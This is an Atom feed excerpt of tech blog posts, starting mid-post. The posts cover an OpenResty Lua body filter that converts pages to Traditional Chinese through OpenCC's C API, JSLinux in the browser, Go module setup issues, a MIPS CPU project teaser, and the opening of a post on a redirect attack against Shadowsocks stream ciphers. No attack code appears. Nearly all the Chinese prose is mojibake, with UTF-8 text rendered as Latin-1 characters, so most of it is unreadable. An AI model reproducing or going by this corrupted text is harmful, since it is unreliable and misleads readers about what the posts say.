è¿™ä¸€ä¸ªé¡µé¢å°±è¶³å¤Ÿäº†ã€‚</p><h1>äº†è§£ OpenCC çš„ C API</h1><p>æ‰€æœ‰å¯ä»¥é€šè¿‡ FFI è°ƒç”¨çš„ C API åœ¨è¿™é‡Œï¼š<a href="http://byvoid.github.io/OpenCC/1.0.4/group__opencc__c__api.html">Open Chinese Convert: OpenCC C API</a>ï¼Œåªæœ‰éå¸¸å°‘çš„å‡ ä¸ªå‡½æ•°ï¼Œé€šè¿‡æè¿°æˆ‘ä»¬å¤§æ¦‚å¯ä»¥å¾—å‡ºè°ƒç”¨é¡ºåºï¼š</p><pre><code class="lang-c">opencc_t inst = opencc_open(&quot;/usr/share/opencc/s2twp.json&quot;);

// æ–‡å­—æ˜¯ utf8 ç¼–ç 
char *input = &quot;è¿™æ˜¯ä¸€æ®µæ–‡å­—&quot;;
char *output = opencc_convert_utf8(inst, input, strlen(input));

// å½“ç„¶ä¹Ÿå¯ä»¥ç”¨è¿™ä¸€ç§æ€è·¯ï¼šå³æå‰åˆ†é…å¥½ output çš„ç©ºé—´
// char *output = (char *)malloc(sizeof(char) * strlen(input) + 1);
// opencc_convert_utf8_to_buffer(inst, input, strlen(input), output);

// æƒ³åŠæ³•æŠŠ output ä¿å­˜èµ·æ¥
....

// æœ€åéœ€è¦åšä¸€äº›æ¸…ç†ï¼Œå¦åˆ™å¯èƒ½ä¼šå†…å­˜æ³„æ¼
opencc_convert_utf8_free(output);
opencc_close(inst);</code></pre><h1>å¼€å§‹æ­£å¼çš„å®è·µ</h1><p>ç†æ¸…æ€è·¯ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹å†™äº†ï¼é¦–å…ˆæ–°å»ºä¸€ä¸ª <code>nginx-opencc-filter.lua</code> çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶æŒ‚è½½åˆ° OpenResty å®¹å™¨ä¸­ï¼š</p><pre><code class="lang-yaml">services:
  nginx:
    volumes:
      # è¿™æ˜¯æˆ‘ç½‘ç«™çš„é…ç½®æ–‡ä»¶
      - ./nginx-docker-live.conf:/path/to/rexskz.conf
      # è¿™æ˜¯åˆšåˆšæ–°å»ºçš„ .lua æ–‡ä»¶
      - ./nginx-opencc-filter.lua:/path/to/opencc-filter.lua
    # ....çœç•¥å…¶å®ƒçš„é…ç½®</code></pre><p>ç„¶ååœ¨ OpenResty é…ç½®æ–‡ä»¶ä¸­åŠ è½½è¿™ä¸ª Lua æ–‡ä»¶ï¼š</p><pre><code class="lang-nginx"># åªä¸ºä½ éœ€è¦è½¬æ¢çš„é¡µé¢æ·»åŠ è¿™ä¸ªé…ç½®ï¼Œä¸è¦æ‰€æœ‰çš„ location éƒ½åŠ 
location /your-page {
    body_filter_by_lua_file /path/to/opencc-filter.lua;
    # ....çœç•¥å…¶å®ƒçš„é…ç½®
}</code></pre><p>æ¥ä¸‹æ¥å¼€å§‹å†™ Lua è„šæœ¬äº†ï¼è‡³äº Lua çš„ç®€å•è¯­æ³•ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šï¼Œè¿™å„¿å°±ä¸èµ˜è¿°äº†ã€‚æ•´ä¸ªè„šæœ¬æ˜¯è¿™æ ·çš„ï¼ŒåŸºæœ¬çš„æ€è·¯è·Ÿåˆšæ‰å†™çš„ C ä»£ç å·®ä¸å¤šï¼Œåº”å½“éå¸¸å¥½ç†è§£ï¼š</p><pre><code class="lang-lua">local cookie_value = ngx.var['cookie_cc_lang']

if cookie_value == 'zh_TW' then
    local ffi = require('ffi')

    ffi.cdef[[
        typedef void* opencc_t;

        opencc_t opencc_open(const char *configFileName);
        int      opencc_close(opencc_t opencc);
        char*    opencc_convert_utf8(opencc_t opencc, const char *input, size_t length);
        void     opencc_convert_utf8_free(char *str);
    ]]

    local cc = ffi.load('opencc')

    local inst = cc.opencc_open('/usr/share/opencc/s2twp.json')
    local input = ngx.arg[1]
    local res = cc.opencc_convert_utf8(inst, input, #input)

    ngx.arg[1] = ffi.string(res)

    cc.opencc_convert_utf8_free(res)
    cc.opencc_close(inst)
end</code></pre><p>æ·»åŠ äº† Cookie ä¹‹ååˆ·æ–°ä¸€ä¸‹ï¼Œå‘ç°é¡µé¢å·²ç»æ˜¯æ­£ä½“ä¸­æ–‡ç‰ˆæœ¬äº†ï¼ä¹‹åçš„æ“ä½œå°±æ˜¯åœ¨é¡µé¢ä¸­é€‚å½“çš„åœ°æ–¹åŠ ä¸Šç®€ä½“ä¸­æ–‡å’Œæ­£ä½“ä¸­æ–‡çš„é“¾æ¥ã€‚</p><h1>ç”±äº Buffer å¯¼è‡´çš„ Bug</h1><p>å¥‡æ€ªçš„æ˜¯ï¼Œä¸æ˜¯æ‰€æœ‰çš„é¡µé¢éƒ½å¯ä»¥æˆåŠŸè½¬æ¢ï¼Œæœ‰äº›é¡µé¢è¿›å»ä¹‹ååªèƒ½åŠ è½½å¾ˆå°‘çš„ä¸€éƒ¨åˆ†æ–‡æœ¬ï¼Œç”šè‡³æœ‰çš„é¡µé¢ç›´æ¥æç¤º <code>ERR_INCOMPLETE_CHUNKED_ENCODING</code>ã€‚å›å»çœ‹ Nginx çš„ Logï¼Œå‘ç°åªè¦ä¸€è®¿é—®è¿™æ ·çš„é¡µé¢ï¼Œå°±ä¼šå¤šä¸€å¥ <code>worker process 8 exited on signal 11</code>ï¼Œæˆ‘çœ‹äº†åŠå¤©ï¼Œæ„Ÿè§‰ Lua è„šæœ¬ä¸åº”è¯¥æœ‰ Bugï¼Œä½† OpenResty çš„ Lua è„šæœ¬åˆä¸æ–¹ä¾¿å•æ­¥è°ƒè¯•ï¼Œäºæ˜¯æˆ‘ç¥­å‡ºäº†å…«å¹´å‰å°±ç†Ÿç»ƒæŒæ¡çš„è¾“å‡ºè°ƒè¯•å¤§æ³•ï¼Œåœ¨ä¸€å¼€å§‹å…ˆè¾“å‡º <code>ngx.arg[1]</code>ï¼Œä¿å­˜åˆ·æ–°ï¼Œäºæ˜¯å‘ç°äº†ä¸€å † UTF-8 ä¸‹é¢çš„ä¹±ç â€¦â€¦æ²¡é”™ï¼Œå°±æ˜¯é»‘è‰²è±å½¢é‡Œé¢å¸¦ä¸€ä¸ªé—®å·çš„é‚£ç§ã€‚</p><p>ä¸€æ¬¡æ­£å¸¸çš„è¯·æ±‚ï¼Œä¼šè¾“å‡ºä¸€æ¬¡æˆ–å¤šæ¬¡ï¼Œæ¯ä¸€æ¬¡éƒ½æ²¡æœ‰è¿™æ ·çš„ä¹±ç ï¼›ä½†å¯¹äºä¸æ­£å¸¸çš„è¯·æ±‚ï¼Œä¸€å®šä¼šåœ¨æœ€åä¸€æ¬¡è¾“å‡ºè¿™æ ·çš„ä¹±ç ï¼Œç„¶å Worker process å°±å´©æºƒäº†ã€‚ç»éªŒå‘Šè¯‰æˆ‘ï¼Œä¸€å®šæ˜¯å› ä¸º Nginx ä¸ºäº†åŠ å¿«é€Ÿåº¦ï¼Œå¯¹è¯·æ±‚åšäº†æµå¼å¤„ç†ï¼Œå°†è¯·æ±‚å’Œå“åº”åˆ‡åˆ†æˆè‹¥å¹²ä¸ª Chunk å‘é€ç»™äº† Lua è„šæœ¬ã€‚ä¸€æ—¦åˆ‡åˆ†çš„ä½ç½®æ°å¥½åœ¨ä¸€ä¸ªæ±‰å­—ï¼ˆå  3 ä¸ªå­—èŠ‚ï¼‰çš„ä¸­é—´ï¼Œé‚£ä¹ˆè¿™ä¸ªæ±‰å­—å°±ä¼šè¢«åˆ‡åˆ†æˆä¸¤ä¸ªä¹±ç ï¼Œè¢«åˆ†æ•£åˆ°äº†ä¸¤ä¸ª Chunk ä¸­ã€‚</p><p>OpenCC ä¸éœ€è¦å¯¹è¿™ç§ç‰¹æ®Šæƒ…å†µåšå…¼å®¹ï¼Œè€Œä¸”å³ä½¿åšäº†å…¼å®¹ï¼Œä¹Ÿæ— æ³•è½¬æ¢è¿™ä¸ªå­—ï¼ˆç”šè‡³è¿™ä¸ªå­—æ‰€åœ¨çš„è¯è¯­ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬èƒ½åšçš„å°±æ˜¯è®© Nginx ä¸åˆ‡åˆ†é¡µé¢çš„ Response bodyã€‚ç”±äºæˆ‘çš„ç½‘ç«™æ˜¯ FastCGI + PHP-FPMï¼ˆä¸Šå¤æ—¶æœŸçš„æŠ€æœ¯äº†ï¼‰ï¼Œå› æ­¤åªéœ€è¦è°ƒå¤§ä¸€ä¸‹ Buffer çš„å€¼å³å¯ï¼ˆç›´æ¥è®¾ç½® <code>fastcgi_buffering off</code> æˆ‘è¯•äº†ä¼¼ä¹æ²¡ç”¨ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼‰ï¼š</p><pre><code class="lang-nginx">fastcgi_buffers           8 256k;
fastcgi_buffer_size       256k;
fastcgi_busy_buffers_size 512k;</code></pre><p>å¯¹äºä½¿ç”¨ <code>proxy_pass</code> ä»£ç†çš„æƒ…å†µï¼Œæœ‰ç­‰ä»·çš„ <code>proxy_buffer_size</code> ç­‰æŒ‡ä»¤ï¼Œç”¨æ³•å®Œå…¨ä¸€æ ·ã€‚</p><p>äºæ˜¯â€¦â€¦æˆ‘çš„ç½‘ç«™å°±è¿™æ ·æ”¯æŒäº†æ­£ä½“ä¸­æ–‡ã€‚</p>]]></content>
        <author>
            <name><![CDATA[RÂ·ex / Zeng]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.invariant.cn/try-jslinux/</id>
        <title><![CDATA[ç”¨ JSLinux åœ¨æµè§ˆå™¨ä¸­è¿è¡Œ Linux]]></title>
        <updated>2020-02-24T16:24:41+08:00</updated>
        <link href="https://blog.invariant.cn/try-jslinux/"/>
        <content type="text/html" src="https://blog.invariant.cn/try-jslinux/"><![CDATA[<figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://invariant.me/try-jslinux/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">Running Linux in your Browser with JSLinux</div><div class="kg-bookmark-description">Yesterday I ported the Wasm-based hardware emulator, JSLinux, to use xterm.js for frontend and my wstunnel for networking.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://invariant.me/favicon.ico" alt="ç”¨ JSLinux åœ¨æµè§ˆå™¨ä¸­è¿è¡Œ Linux"><span class="kg-bookmark-author">Heyang Zhou</span><span class="kg-bookmark-publisher">The Invariant</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://invariant.me/content/images/2020/02/Alpine_logo.png" alt="ç”¨ JSLinux åœ¨æµè§ˆå™¨ä¸­è¿è¡Œ Linux"></div></a></figure><img src="https://blog.invariant.cn/content/images/2020/03/Alpine_logo.png" alt="ç”¨ JSLinux åœ¨æµè§ˆå™¨ä¸­è¿è¡Œ Linux"><p><a href="https://bellard.org/jslinux/">JSLinux</a> æ˜¯ <a href="https://bellard.org/">Fabrice Bellard</a> å†™çš„ä¸€ä¸ªæ”¯æŒ 32 ä½ x86 å’Œ 32/64 ä½ RISC-V ç³»ç»Ÿæ¨¡æ‹Ÿçš„ç¡¬ä»¶æ¨¡æ‹Ÿå™¨ï¼Œå¯ç¼–è¯‘ä¸º WebAssembly ä»¥åœ¨æµè§ˆå™¨ä¸­è¿è¡Œã€‚</p><p>æ˜¨å¤©æˆ‘<a href="https://github.com/losfair/jslinux-wstunnel">å¼€äº†ä¸€ä¸ªåˆ†æ”¯</a>ï¼ŒæŠŠå­—ç¬¦ç»ˆç«¯å®ç°æ¢æˆäº† <a href="https://xtermjs.org/">xterm.js</a> ï¼ŒæŠŠç½‘ç»œå®ç°æ¢æˆäº†æˆ‘çš„ <a href="https://github.com/losfair/wstunnel">wstunnel</a> ã€‚è¿™é‡Œæ˜¯ä¸€ä¸ªåœ¨ä¿®æ”¹åçš„ JSLinux ä¸Šè¿è¡Œ Alpine Linux çš„ x86 è™šæ‹Ÿæœºï¼Œå¯ä»¥åœ¨çº¿è¯•ç”¨ã€‚è¯·ä¸è¦æ»¥ç”¨ç½‘ç»œ :)</p><!--kg-card-begin: html--><iframe style="width: 100%; height: 500px" src="https://jslinux.invariant.me/widget.html">&lt;iframe disabled?&gt;</iframe><!--kg-card-end: html-->]]></content>
        <author>
            <name><![CDATA[The Invariant ä¸­æ–‡]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://invariant.me/try-jslinux/</id>
        <title><![CDATA[Running Linux in your Browser with JSLinux]]></title>
        <updated>2020-02-24T16:16:18+08:00</updated>
        <link href="https://invariant.me/try-jslinux/"/>
        <content type="text/html" src="https://invariant.me/try-jslinux/"><![CDATA[<img src="https://invariant.me/content/images/2020/02/Alpine_logo.png" alt="Running Linux in your Browser with JSLinux"><p><a href="https://bellard.org/jslinux/">JSLinux</a> is an awesome emulator by <a href="https://bellard.org/">Fabrice Bellard</a> that implements full 32-bit x86 and RV32/RV64 RISC-V systems in the browser using WebAssembly.</p><p>Yesterday I <a href="https://github.com/losfair/jslinux-wstunnel">ported</a> JSLinux to use <a href="https://xtermjs.org/">xterm.js</a> for frontend and my <a href="https://github.com/losfair/wstunnel">wstunnel</a> for networking. Below is a live x86 virtual machine running Alpine Linux. Feel free to try it here (but please do not abuse the network interface) !</p><!--kg-card-begin: html--><iframe style="width: 100%; height: 500px" src="https://jslinux.invariant.me/widget.html">&lt;iframe disabled?&gt;</iframe><!--kg-card-end: html--><p></p>]]></content>
        <author>
            <name><![CDATA[The Invariant]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.rexskz.info/go-module-memo.html</id>
        <title><![CDATA[Go module è¸©å‘å¤‡å¿˜]]></title>
        <updated>2020-02-16T09:25:24+08:00</updated>
        <link href="https://blog.rexskz.info/go-module-memo.html"/>
        <content type="text/html" src="https://blog.rexskz.info/go-module-memo.html"><![CDATA[<p>æœ€è¿‘ç”±äºä¸šåŠ¡éœ€æ±‚ï¼Œéœ€è¦æ–°å¼€ä¸€ä¸ª Go çš„é¡¹ç›®ã€‚å¬æœ‹å‹è¯´ Go ä» 1.11 å¼€å§‹æœ‰äº†ä¸ªå« Modules çš„æ–°ç‰¹æ€§ï¼Œäºæ˜¯æ‰“ç®—çœ‹çœ‹èƒ½å¦ç”¨åœ¨æˆ‘çš„æ–°é¡¹ç›®ä¸­ã€‚</p><p>ä¸ºä»€ä¹ˆæˆ‘å¯¹ Modules è¿™ä¹ˆæ„Ÿå…´è¶£å‘¢ï¼Ÿå› ä¸ºå†™é¡¹ç›®æ€»æ˜¯é€ƒä¸å¼€å„ç§åŒ…ç®¡ç†ï¼Œè€Œä¹‹å‰ Go ä¸ç®¡æ˜¯å®˜æ–¹è¿˜æ˜¯éå®˜æ–¹çš„åŒ…ç®¡ç†å™¨ï¼Œéƒ½æ˜¯åŸºäº <code>GOPATH</code> æˆ–è€… <code>vendor</code> ç›®å½•ï¼Œä¹Ÿæ— æ³•å¾ˆå¥½çš„è§£å†³ä¸åŒç‰ˆæœ¬çš„å†²çªã€‚Modules æ®è¯´å¯ä»¥è§£å†³è¿™äº›é—®é¢˜ã€‚</p><p>æˆ‘ä»¬ä¹‹å‰çš„é¡¹ç›®ç”¨çš„æ˜¯ Go å®˜æ–¹çš„åŒ…ç®¡ç†å™¨ <code>dep</code>ï¼ŒçœŸæ˜¯è¢«æˆ‘ä»¬åæ§½äº†å¥½ä¹…ï¼š</p><ul><li>å®ƒé»˜è®¤ä¸æ˜¾ç¤ºè¿›åº¦ï¼Œé™¤éæ‰‹åŠ¨æ·»åŠ  <code>-v</code> å‚æ•°ï¼›</li><li>å‘½ä»¤ååˆ†è¯¡å¼‚ï¼Œä»¥å®‰è£…ä¸ºä¾‹ï¼Œæˆ‘è§è¿‡çš„æœ‰ï¼š<code>npm install</code>ã€<code>gem install</code>ã€<code>pip install</code>ï¼Œè¿˜æœ‰â€¦â€¦<code>dep ensure</code>ï¼›</li><li>æˆ‘æ— æ³•æŠŠ Go çš„é¡¹ç›®è·Ÿå…¶å®ƒé¡¹ç›®æ”¾åœ¨åŒä¸€ä¸ª Workspace ä¸‹é¢ï¼Œè€Œå¿…é¡»æ”¾åˆ° <code>GOPATH</code> ä¸‹é¢ã€‚</li></ul><p>è¯•ç”¨äº†ä¸€ä¸‹ Modulesï¼Œå‘ç°æœ‰è¿™å‡ ä¸ªå¥½å¤„ï¼š</p><ul><li>å®ƒé»˜è®¤åœ¨å®‰è£…æ—¶ä¼šæ˜¾ç¤ºè¿›åº¦ï¼Œåœ¨å›½å†…ä¼—æ‰€å‘¨çŸ¥çš„ç½‘ç»œç¯å¢ƒä¸‹å¯ä»¥è½»æ¾ç¡®å®šç½‘ç»œæ˜¯å¦æœ‰é—®é¢˜ï¼›</li><li>å®ƒæ˜¯ Go çš„åŸç”Ÿå‘½ä»¤ï¼Œä½¿ç”¨èµ·æ¥è·Ÿ Go çš„å…¶å®ƒå‘½ä»¤æ¯”è¾ƒåƒï¼Œæ²¡æœ‰è¿å’Œæ„Ÿï¼›</li><li>å®ƒå…è®¸æˆ‘ä»¬æŠŠ Go é¡¹ç›®æ”¾åˆ°ä»»æ„çš„åœ°æ–¹ï¼›</li><li>å®ƒæœ‰ä¸€äº›å¾ˆæ£’çš„åŠŸèƒ½ï¼Œä¾‹å¦‚ç”Ÿæˆä¾èµ–å…³ç³»å›¾ã€ç”Ÿæˆ vendor æ–‡ä»¶å¤¹ã€éªŒè¯åŒ…çš„å†…å®¹ã€è§£é‡Šä¸ºä½•éœ€è¦ä¾èµ–æŸä¸ªåŒ…ã€‚</li></ul><p>å¯¹äºå¤§éƒ¨åˆ†äººæ¥è¯´ï¼Œç…§ç€ç½‘ä¸Šçš„æ•™ç¨‹æ¥åšå°±å¯ä»¥äº†ï¼Œæˆ‘åœ¨åšçš„æ—¶å€™ï¼Œé‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œäºæ˜¯å°±åœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚</p><h1>VSCode æ’ä»¶</h1><p>VSCode çš„æ’ä»¶ <code>ms-vscode.go</code> å·²ç»å¯ä»¥å®Œç¾æ”¯æŒ Go Modules äº†ï¼Œæ›´æ–°åˆ°æœ€æ–°ç‰ˆå³å¯ã€‚ç”±äºæˆ‘è¿˜æœ‰é¡¹ç›®éœ€è¦ä½¿ç”¨ <code>dep</code>ï¼Œå› æ­¤æˆ‘åœ¨ <code>settings.json</code> é‡Œé¢æ–°å¢äº†è¿™äº›ï¼š</p><pre><code class="lang-json">{
    &quot;go.toolsEnvVars&quot;: {
        &quot;GO111MODULE&quot;: &quot;auto&quot;
    },
}</code></pre><p>ç¯å¢ƒå˜é‡ <code>GO111MODULE</code> çš„å–å€¼æœ‰ä¸‰ä¸ªï¼š<code>off</code> è¡¨ç¤ºå¼ºè¡Œä½¿ç”¨ <code>GOPATH</code> çš„æ–¹æ³•ï¼ˆé€‚ç”¨äº <code>dep</code>ï¼‰ï¼Œ<code>on</code> è¡¨ç¤ºå¼ºè¡Œä½¿ç”¨ Modulesï¼Œ<code>auto</code> è¡¨ç¤ºå¦‚æœå‘ç°ä½ çš„é¡¹ç›®åœ¨ <code>GOPATH</code> é‚£ä¹ˆå°±ç”¨ä¼ ç»Ÿæ–¹æ³•ï¼ˆå³ä½¿æœ‰äº† <code>go.mod</code> æ–‡ä»¶ï¼‰ï¼Œå¦åˆ™å°±ç”¨ Modulesã€‚</p><h1>æŠ¥é”™ no package for import "fmt"</h1><p>è¿™ç§é”™è¯¯å°±æ¯”è¾ƒå¥‡è‘©äº†ï¼Œæˆ‘ç›¸ä¿¡å¾ˆå¤šäººéƒ½é‡åˆ°è¿‡æ‰¾ä¸åˆ°å…¶å®ƒåŒ…çš„æƒ…å†µï¼Œä½†æˆ‘è¿™å„¿è¿ <code>fmt</code> éƒ½æ‰¾ä¸åˆ°â€¦â€¦</p><p>æœäº†ä¸€ä¸‹ï¼Œè¿™æ˜¯ <code>gopls</code> çš„æŠ¥é”™ï¼Œäºæ˜¯ç”¨ <code>gopls -rpc.trace -v check file.go</code> çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°ç”±äºæˆ‘é¡¹ç›®æ–‡ä»¶çš„é—®é¢˜ï¼ŒæŠ¥é”™ <code>initial workspace load failed</code>ï¼Œè¿™ä¸ª Workspace é‡Œé¢åº”å½“åŒ…å« <code>./...</code> å’Œ <code>builtin</code>ï¼Œ<code>fmt</code> å±äºåè€…ï¼Œå› æ­¤ä¹Ÿè·Ÿç€æ‰¾ä¸åˆ°äº†ã€‚</p><p>é‚£ä¹ˆè¯¥å¦‚ä½•åœ¨é¡¹ç›®ä¸­å¼•ç”¨é¡¹ç›®æœ¬èº«çš„åŒ…å‘¢ï¼Ÿä¾‹å¦‚æˆ‘çš„é¡¹ç›®å« <code>myproj</code>ï¼Œæˆ‘è¦åœ¨ <code>cmd/main.go</code> é‡Œé¢ä¾èµ– <code>cmd/server</code> åŒ…ã€‚</p><p>é€šè¿‡æœç´¢ï¼Œæˆ‘å¾—çŸ¥å¯ä»¥åœ¨ <code>go.mod</code> é‡Œé¢é…ç½®ä¸€è¡Œ <code>replace myproj =&gt; ./</code>ï¼Œæ•´ä¸ªæ–‡ä»¶å¦‚ä¸‹ï¼š</p><pre><code>module myproj

replace myproj =&gt; ./

go 1.13

require (
    ....
)</code></pre><p>ä¹‹åçš„å¼•ç”¨å°±å¯ä»¥è¿™æ ·å†™äº†ï¼š</p><pre><code class="lang-go">import (
    &quot;myproj/cmd/server&quot;
)</code></pre><p>æœ€åæµ‹äº†ä¸€ä¸‹ï¼ŒVSCode æ’ä»¶çš„å„ç§åŠŸèƒ½ï¼ˆè‡ªåŠ¨å¯¼å…¥ã€æ ¼å¼åŒ–ã€è·³è½¬ã€è°ƒè¯•ï¼‰éƒ½æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œè¿™å°±ç®—æ˜¯å¤§åŠŸå‘Šæˆäº†ã€‚è‡³äºç”¨èµ·æ¥å…·ä½“æ€ä¹ˆæ ·ï¼Œè¿˜æœ‰æ²¡æœ‰å…¶å®ƒçš„å‘ï¼Œå¯èƒ½å¾—ç­‰è¿‡ä¸€æ®µæ—¶é—´æ‰èƒ½çŸ¥é“äº†ã€‚</p><h1>å‚è€ƒèµ„æ–™</h1><ul><li><a href="https://github.com/golang/go/issues/32762#issuecomment-518828774">x/tools/gopls: failure to import package Â· Issue #32762 Â· golang/go</a></li><li><a href="https://stackoverflow.com/a/52124448">vgo - How do I resolve &quot;cannot find module for path X&quot; importing a local Go module? - Stack Overflow</a></li></ul>]]></content>
        <author>
            <name><![CDATA[RÂ·ex / Zeng]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://invariant.me/designing-a-superscalar-ooo-mips-cpu-from-scratch/</id>
        <title><![CDATA[[PLACEHOLDER] Designing a superscalar MIPS CPU from scratch: #0]]></title>
        <updated>2020-02-16T07:31:33+08:00</updated>
        <link href="https://invariant.me/designing-a-superscalar-ooo-mips-cpu-from-scratch/"/>
        <content type="text/html" src="https://invariant.me/designing-a-superscalar-ooo-mips-cpu-from-scratch/"><![CDATA[<img src="https://images.unsplash.com/photo-1555589228-135c25ae8cf5?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=2000&fit=max&ixid=eyJhcHBfaWQiOjExNzczfQ" alt="[PLACEHOLDER] Designing a superscalar MIPS CPU from scratch: #0"><p>The CS undergraduate programme at <a href="https://nuaa.edu.cn/">NUAA</a> includes a (compulsory) Computer Organization course for this (4th) semester that requires implementing a MIPS CPU on the <a href="http://www.loongson.cn/index.html">Loongson</a> <a href="http://www.loongson.cn/news/company/628.html">development kit</a>, which is essentially a FPGA board + various useful modules.</p><p>As shown below, the suggested design is a classical 5-stage pipelined architecture:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://invariant.me/content/images/2020/02/--2020-02-16--2.39.51.png" class="kg-image" alt="[PLACEHOLDER] Designing a superscalar MIPS CPU from scratch: #0"><figcaption>Suggested basic 5-stage pipeline</figcaption></figure><p>But it's boring to write "yet another" CPU that implements only the simplest structures. So I decided to extend the design a bit, and build a <a href="https://en.wikipedia.org/wiki/Superscalar_processor">superscalar</a> <a href="https://en.wikipedia.org/wiki/Out-of-order_execution">OoO</a> architecture from the ground up.</p><p>During the next few months I will post my experience as a series of posts both here and on WeChat. <a href="https://invariant.me/subscribe/">Subscribe</a> to stay updated!</p>]]></content>
        <author>
            <name><![CDATA[The Invariant]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.rexskz.info/redirect-attack-weakness-of-ss-stream-cipher.html</id>
        <title><![CDATA[Redirect attack - Shadowsocks æµå¯†ç çš„ä¸å®‰å…¨å› ç´ ]]></title>
        <updated>2020-02-14T18:18:00+08:00</updated>
        <link href="https://blog.rexskz.info/redirect-attack-weakness-of-ss-stream-cipher.html"/>
        <content type="text/html" src="https://blog.rexskz.info/redirect-attack-weakness-of-ss-stream-cipher.html"><![CDATA[<p>Shadowsocks æ˜¯ä¸€æ¬¾é™ªä¼´æ— æ•°ç©å®¶å¤šå¹´çš„ç§‘å­¦ä¸Šç½‘å·¥å…·ï¼Œä½†æ˜¯è¿‘å¹´æ¥éšç€å¢™çš„æ—¥ç›Šå¢é«˜ï¼Œä¸€äº› Shadowsocks æµé‡å·²ç»å¯ä»¥è¢«å¾ˆå¥½çš„è¯†åˆ«å‡ºæ¥ï¼Œç„¶åå°±æ˜¯â€”â€”â€œåŒå¿—ï¼Œä½ æ¢¯å­å¡Œäº†â€ã€‚</p><p>è™½ç„¶â€œåè®®å¯ä»¥è¢«è¯†åˆ«â€å·²ç»ä¼—æ‰€å‘¨çŸ¥ï¼Œä½†æˆ‘ä»¬ä¾æ—§è®¤ä¸ºï¼ŒShadowsocks çš„åŠ å¯†åšçš„ä¸é”™ï¼Œä¸­é—´äººåº”å½“ç ´è§£ä¸å‡ºæ˜æ–‡ä¿¡æ¯ã€‚</p><p>ç„¶è€Œï¼Œæ™šä¸Šçœ‹åˆ°çš„ä¸€ç¯‡ <a href="https://github.com/edwardz246003/shadowsocks/blob/master/Redirect%20attack%20on%20Shadowsocks%20stream%20ciphers.pdf">æ–‡ç« </a>ï¼Œç¨ç¨åŠ¨æ‘‡äº†ä¸€ä¸‹æˆ‘å¯¹ Shadowsocks æ•°æ®å®‰å…¨çš„ä¿¡å¿ƒï¼Œæ›´è®©æˆ‘é‡æ–°å®¡è§†äº†ä¸€ä¸‹æµå¯†ç çš„å®‰å…¨æ€§ã€‚ä¹‹å‰æˆ‘åœ¨åšå®‰å…¨æ–¹é¢çš„ç§‘æ™®çš„æ—¶å€™ï¼Œæˆ‘æ€»ä¼šæåˆ°â€œECB æ˜¯ä¸å®‰å…¨çš„â€ï¼Œä½†ç°åœ¨å‘ç°ï¼Œå…¶å®ƒçš„ä¸€äº›æµå¯†ç ä¹Ÿä¸ä¸€å®šå®‰å…¨ï¼Œå› ä¸ºå®ƒä»¬æ²¡æœ‰ä¿è¯æ•°æ®çš„å®Œæ•´æ€§ï¼Œå› æ­¤å­˜åœ¨æ•°æ®è¢«ç¯¡æ”¹çš„å¯èƒ½æ€§ã€‚</p><blockquote><p>Shadowsocks å¦‚æœé…ç½®å¾—å½“ï¼Œè¿˜æ˜¯æ¯”è¾ƒå®‰å…¨çš„ï¼Œæˆ–è€…è‡³å°‘å¯ä»¥è®©ç›®å‰çš„ç ´è§£æ–¹æ³•æ²¡æœ‰ç”¨æ­¦ä¹‹åœ°ã€‚å¦‚æœçœ‹å®Œæœ¬æ–‡åä¾æ—§ä¸æ”¾å¿ƒï¼Œå¯ä»¥ä½¿ç”¨å…¶å®ƒçš„ç§‘å­¦ä¸Šç½‘å·¥å…·ã€‚</p><p>æœ¬æ–‡çš„ä¸€äº›å›¾ç‰‡å¼•ç”¨è‡ªç»´åŸºç™¾ç§‘ï¼Œå¯èƒ½éœ€è¦ç§‘å­¦åœ°è§‚çœ‹ã€‚</p></blockquote><h1>ä¸€äº›åŸºæœ¬æ¦‚å¿µ</h1><p>è€ƒè™‘åˆ°å¯èƒ½æœ‰äº›åŒå­¦æ²¡æœ‰å¯†ç å­¦çš„åŸºç¡€ï¼Œä¹Ÿå¯¹ Shadowsocks çš„åè®®ä¸æ˜¯å¾ˆäº†è§£ï¼Œè¿™é‡Œå°±ç®€å•çš„ä»‹ç»ä¸€ä¸‹ã€‚å¦‚æœæ‚¨å·²ç»æœ‰è¶³å¤Ÿçš„çŸ¥è¯†ï¼Œå¯ä»¥ <a href="#toc-link-5">è·³åˆ°ä¸‹ä¸€èŠ‚</a>ã€‚</p><h2>æµå¯†ç </h2><p>ç›¸ä¿¡ä¸å°‘äººéƒ½å¬è¯´è¿‡ AES ä¹‹ç±»çš„å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œä½†å¹¶æ²¡æœ‰äº†è§£çš„é‚£ä¹ˆç»†è‡´ã€‚ä¾‹å¦‚ä»€ä¹ˆæ˜¯ IVï¼Ÿä»€ä¹ˆæ˜¯åŸºäºæ•°æ®å—çš„åŠ å¯†ï¼Ÿ</p><p>äº‹å®ä¸Šï¼ŒAES ç®—æ³•æœ¬ä½“å¹¶ä¸æ˜¯ä¸ºäº†å¤„ç†æ— é™é•¿åº¦çš„å­—ç¬¦ä¸²è€Œè®¾è®¡çš„ï¼Œå®ƒä¸€æ¬¡åªèƒ½å¤„ç† 16 ä¸ªå­—èŠ‚ï¼ˆä¸ç®¡æ˜¯ <code>AES-128</code> è¿˜æ˜¯ <code>AES-256</code>ï¼‰ï¼Œæˆ‘ä»¬ç®¡è¿™ 16 ä¸ªå­—èŠ‚å«åšä¸€ä¸ªâ€œæ•°æ®å—â€ï¼ŒAES 